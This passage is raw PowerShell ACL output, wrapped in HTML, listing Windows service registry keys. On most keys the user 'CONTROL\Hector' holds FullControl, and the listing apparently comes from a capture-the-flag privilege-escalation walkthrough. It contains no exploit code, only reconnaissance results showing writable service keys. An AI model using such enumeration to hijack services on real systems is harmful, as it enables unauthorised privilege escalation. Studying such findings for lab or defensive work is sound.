Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\HdAudAddService</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\HDAudBus</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\HDAudBus</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\HidBatt</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\HidBatt</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\hidinterrupt</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\hidinterrupt</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\hidserv</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\hidserv</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\HidUsb</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\HidUsb</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\HomeGroupListener</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\HomeGroupListener</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\HpSAMD</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\HpSAMD</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\HTTP</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\HTTP</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\hvcrash</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\hvcrash</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\HvHost</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\HvHost</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\hvservice</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\hvservice</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\HwNClx0101</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\HwNClx0101</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\hwpolicy</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\hwpolicy</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\hyperkbd</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\hyperkbd</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\HyperVideo</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\HyperVideo</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\i8042prt</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\i8042prt</span><br><span class="line">AccessToString          : BUILTIN\Users Allow  ReadKey</span><br><span class="line">                          BUILTIN\Users Allow  -2147483648</span><br><span class="line">                          BUILTIN\Power Users Allow  ReadKey</span><br><span class="line">                          BUILTIN\Power Users Allow  -2147483648</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\iaLPSSi_GPIO</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\iaLPSSi_GPIO</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\iaLPSSi_I2C</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\iaLPSSi_I2C</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\iaStorAVC</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\iaStorAVC</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\iaStorV</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\iaStorV</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ibbus</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ibbus</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\icssvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\icssvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\IKEEXT</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\IKEEXT</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\IndirectKmd</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\IndirectKmd</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\inetaccs</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\inetaccs</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\InetInfo</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\InetInfo</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\InstallService</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\InstallService</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\intelide</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\intelide</span><br><span class="line">AccessToString          : BUILTIN\Users Allow  ReadKey</span><br><span class="line">                          BUILTIN\Users Allow  -2147483648</span><br><span class="line">                          BUILTIN\Power Users Allow  ReadKey</span><br><span class="line">                          BUILTIN\Power Users Allow  -2147483648</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\intelpep</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\intelpep</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\intelppm</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\intelppm</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\iorate</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\iorate</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\IpFilterDriver</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\IpFilterDriver</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\iphlpsvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\iphlpsvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\IPMIDRV</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\IPMIDRV</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\IPNAT</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\IPNAT</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\IPsecGW</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\IPsecGW</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\IPT</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\IPT</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\isapnp</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\isapnp</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\iScsiPrt</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\iScsiPrt</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ItSas35i</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ItSas35i</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\kbdclass</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\kbdclass</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\kbdhid</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\kbdhid</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\kdnic</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\kdnic</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\KeyIso</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\KeyIso</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\KPSSVC</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\KPSSVC</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\KSecDD</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\KSecDD</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\KSecPkg</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\KSecPkg</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ksthunk</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ksthunk</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\KtmRm</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\KtmRm</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\LanmanServer</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\LanmanServer</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\LanmanWorkstation</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\LanmanWorkstation</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ldap</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ldap</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\lfsvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\lfsvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\LicenseManager</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\LicenseManager</span><br><span class="line">                          NT 